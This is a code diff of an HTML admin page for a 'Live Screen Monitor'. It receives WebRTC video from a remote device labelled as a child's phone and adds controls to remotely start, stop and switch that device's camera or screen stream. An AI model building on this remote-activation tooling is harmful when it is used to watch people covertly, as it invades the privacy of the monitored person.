@@ -1,237 +1,250 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Screen Monitor</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
-    <style>
-        /* --- 1. GENERAL STYLES --- */
-        body {
-            background-color: #1a1a1a; /* Dark Background */
-            color: white;
-            font-family: 'Segoe UI', sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Live Screen Monitor</title>
 
-        h2 { margin-bottom: 20px; font-weight: 300; letter-spacing: 1px; }
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
 
-        /* --- 2. CONTROLS (Input & Button) --- */
-        .controls {
-            margin-bottom: 30px;
-            display: flex;
-            gap: 10px;
-            z-index: 10;
-        }
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+}
 
-        input {
-            padding: 12px 20px;
-            border-radius: 25px;
-            border: none;
-            outline: none;
-            background: #333;
-            color: white;
-            font-size: 16px;
-            text-align: center;
-            width: 200px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-        }
+body{
+    background:#000;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
 
-        button {
-            padding: 12px 25px;
-            border-radius: 25px;
-            border: none;
-            background: #007AFF; /* iOS Blue */
-            color: white;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: transform 0.2s, background 0.2s;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-        }
+.phone{
+    width:100%;
+    max-width:420px;
+    height:100vh;
+    background:#000;
+    display:flex;
+    flex-direction:column;
+    position:relative;
+}
 
-        button:hover { background: #0056b3; transform: scale(1.05); }
-        button:active { transform: scale(0.95); }
+/* HEADER */
+.header{
+    height:55px;
+    background:rgba(0,0,0,.6);
+    color:white;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 16px;
+    border-bottom:1px solid rgba(255,255,255,.1);
+}
 
-        /* --- 3. PHONE FRAME DESIGN (iPhone Look) --- */
-        .phone-frame {
-            position: relative;
-            width: 300px;  /* Phone Width */
-            height: 600px; /* Phone Height */
-            background-color: #000;
-            border-radius: 40px;
-            border: 8px solid #444; /* Phone Edge */
-            box-shadow: 0 0 50px rgba(0,0,0,0.8), inset 0 0 10px rgba(255,255,255,0.1);
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
+.header span{
+    font-size:15px;
+    font-weight:600;
+}
 
-        /* The Notch */
-        .notch {
-            position: absolute;
-            top: 0;
-            width: 120px;
-            height: 25px;
-            background: #000;
-            border-bottom-left-radius: 15px;
-            border-bottom-right-radius: 15px;
-            z-index: 5;
-        }
+.live{
+    background:#00ff9c;
+    color:#000;
+    padding:4px 12px;
+    border-radius:20px;
+    font-size:12px;
+    font-weight:700;
+    display:none;
+}
 
-        /* The Video Screen */
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: contain; /* Maintain Aspect Ratio */
-            background: #000;
-        }
+/* VIDEO */
+.viewer{
+    flex:1;
+    background:#000;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
 
-        /* Status Text overlay */
-        .status-text {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: #666;
-            font-size: 14px;
-            pointer-events: none;
-        }
+video{
+    width:100%;
+    height:100%;
+    object-fit:contain;
+    background:#000;
+}
 
-        /* Home Bar Indicator */
-        .home-bar {
-            position: absolute;
-            bottom: 10px;
-            width: 100px;
-            height: 4px;
-            background: rgba(255,255,255,0.3);
-            border-radius: 2px;
-            z-index: 5;
-        }
+/* CONTROLS */
+.controls{
+    height:70px;
+    background:#111;
+    display:flex;
+    gap:12px;
+    padding:12px;
+    border-top:1px solid rgba(255,255,255,.1);
+}
 
-    </style>
+.btn{
+    flex:1;
+    border:none;
+    border-radius:14px;
+    font-size:15px;
+    font-weight:700;
+    color:white;
+    cursor:pointer;
+}
+
+.start{ background:#2ecc71; color:#000; }
+.stop{ background:#e74c3c; }
+.switch{ background:#3498db; max-width:70px; }
+</style>
 </head>
+
 <body>
 
-    <h2>Live Screen Monitor</h2>
+<div class="phone">
 
-    <div class="controls">
-        <input type="text" id="deviceId" placeholder="Enter Device ID" value="child_device_1">
-        <button onclick="startMonitoring()">Start Monitoring</button>
+    <!-- HEADER -->
+    <div class="header">
+        <span>Live Screen</span>
+        <div id="liveBadge" class="live">LIVE</div>
     </div>
 
-    <div class="phone-frame">
-        <div class="notch"></div>
-        <div id="status" class="status-text">Waiting for connection...</div>
+    <!-- VIDEO -->
+    <div class="viewer">
         <video id="remoteVideo" autoplay playsinline muted></video>
-        <div class="home-bar"></div>
     </div>
 
-    <script>
-        // --- CONFIGURATION ---
-        const SERVER_URL = "https://child-v9no.onrender.com"; // Tumhara Server
-        const socket = io(SERVER_URL);
+    <!-- CONTROLS -->
+    <div class="controls">
+        <button class="btn start" onclick="startScreen()">▶ START</button>
+        <button class="btn switch" onclick="switchCamera()">🔄</button>
+        <button class="btn stop" onclick="stopScreen()">⏹ STOP</button>
+    </div>
 
-        let peerConnection;
-        const config = {
-            iceServers: [
-                { urls: "stun:stun.l.google.com:19302" }
-            ]
-        };
+</div>
 
-        const remoteVideo = document.getElementById("remoteVideo");
-        const statusText = document.getElementById("status");
+<script>
+/* ================= CONFIG ================= */
 
-        // --- 1. SOCKET EVENTS ---
-        socket.on("connect", () => {
-            console.log("Connected to Server ID:", socket.id);
-            // Admin joins as 'ADMIN' room internally if server logic supports it,
-            // or we just listen for messages targeted to ADMIN.
-            socket.emit("join-room", "ADMIN"); 
-        });
+const SERVER = "https://child-v9no.onrender.com";
 
-        // Answer receive karna (Android se)
-        socket.on("answer", async (data) => {
-            if (data.target === "ADMIN") {
-                console.log("Received Answer");
-                await peerConnection.setRemoteDescription(new RTCSessionDescription({
-                    type: "answer",
-                    sdp: data.sdp
-                }));
-            }
-        });
+const params = new URLSearchParams(window.location.search);
+let DEVICE_ID = params.get("id") || localStorage.getItem("savedDeviceId");
 
-        // ICE Candidate receive karna
-        socket.on("candidate", async (data) => {
-            if (data.target === "ADMIN" && peerConnection) {
-                try {
-                    await peerConnection.addIceCandidate(new RTCIceCandidate({
-                        candidate: data.candidate,
-                        sdpMid: data.sdpMid,
-                        sdpMLineIndex: data.sdpMLineIndex
-                    }));
-                } catch (e) {
-                    console.error("Error adding candidate", e);
-                }
-            }
-        });
+if(!DEVICE_ID){
+    alert("Device ID missing");
+}
 
-        // --- 2. START MONITORING FUNCTION ---
-        async function startMonitoring() {
-            const targetDeviceId = document.getElementById("deviceId").value;
-            if (!targetDeviceId) {
-                alert("Please enter a Device ID");
-                return;
-            }
+/* ================= WEBRTC ================= */
 
-            statusText.innerText = "Connecting...";
-            createPeerConnection(targetDeviceId);
+let socket;
+let pc;
 
-            // Create Offer
-            const offer = await peerConnection.createOffer();
-            await peerConnection.setLocalDescription(offer);
+const config = {
+    iceServers:[{ urls:"stun:stun.l.google.com:19302" }]
+};
 
-            // Send Offer to Android
-            // Note: Server must be configured to relay this to the specific deviceId
-            socket.emit("offer", {
-                target: targetDeviceId,
-                sdp: offer.sdp
+/* ================= SOCKET ================= */
+
+socket = io(SERVER);
+
+socket.on("connect", ()=>{
+    socket.emit("join-room","ADMIN");
+});
+
+/* ================= OFFER ================= */
+
+socket.on("offer", async (data)=>{
+
+    pc = new RTCPeerConnection(config);
+
+    pc.ontrack = e=>{
+        const video = document.getElementById("remoteVideo");
+
+        if(e.streams && e.streams[0]){
+            video.srcObject = e.streams[0];
+        }else{
+            const s = new MediaStream();
+            s.addTrack(e.track);
+            video.srcObject = s;
+        }
+
+        video.play().catch(()=>{});
+        document.getElementById("liveBadge").style.display="block";
+    };
+
+    pc.onicecandidate = e=>{
+        if(e.candidate){
+            socket.emit("candidate",{
+                target: DEVICE_ID,
+                candidate: e.candidate.candidate,
+                sdpMid: e.candidate.sdpMid,
+                sdpMLineIndex: e.candidate.sdpMLineIndex
             });
-            console.log("Offer sent to:", targetDeviceId);
         }
+    };
 
-        // --- 3. WEBRTC SETUP ---
-        function createPeerConnection(deviceId) {
-            if (peerConnection) peerConnection.close();
+    await pc.setRemoteDescription(
+        new RTCSessionDescription({
+            type:"offer",
+            sdp:data.sdp
+        })
+    );
 
-            peerConnection = new RTCPeerConnection(config);
+    const ans = await pc.createAnswer();
+    await pc.setLocalDescription(ans);
 
-            // Handle incoming video stream
-            peerConnection.ontrack = (event) => {
-                console.log("Stream Received!");
-                statusText.style.display = "none"; // Hide text
-                remoteVideo.srcObject = event.streams[0];
-            };
+    socket.emit("answer",{
+        target: DEVICE_ID,
+        sdp: ans.sdp
+    });
+});
 
-            // Send ICE Candidates to Android
-            peerConnection.onicecandidate = (event) => {
-                if (event.candidate) {
-                    socket.emit("candidate", {
-                        target: deviceId,
-                        candidate: event.candidate.candidate,
-                        sdpMid: event.candidate.sdpMid,
-                        sdpMLineIndex: event.candidate.sdpMLineIndex
-                    });
-                }
-            };
-        }
-    </script>
+/* ================= ICE ================= */
+
+socket.on("candidate", async d=>{
+    if(pc){
+        await pc.addIceCandidate(
+            new RTCIceCandidate({
+                candidate:d.candidate,
+                sdpMid:d.sdpMid,
+                sdpMLineIndex:d.sdpMLineIndex
+            })
+        );
+    }
+});
+
+/* ================= CONTROLS ================= */
+
+function startScreen(){
+    socket.emit("send-command",{
+        targetId: DEVICE_ID,
+        command:"start_video"
+    });
+}
+
+function stopScreen(){
+    socket.emit("send-command",{
+        targetId: DEVICE_ID,
+        command:"stop_video"
+    });
+
+    if(pc){
+        pc.close();
+        pc=null;
+    }
+
+    document.getElementById("remoteVideo").srcObject=null;
+    document.getElementById("liveBadge").style.display="none";
+}
+
+function switchCamera(){
+    socket.emit("switch-camera",{ target: DEVICE_ID });
+}
+</script>
+
 </body>
 </html>
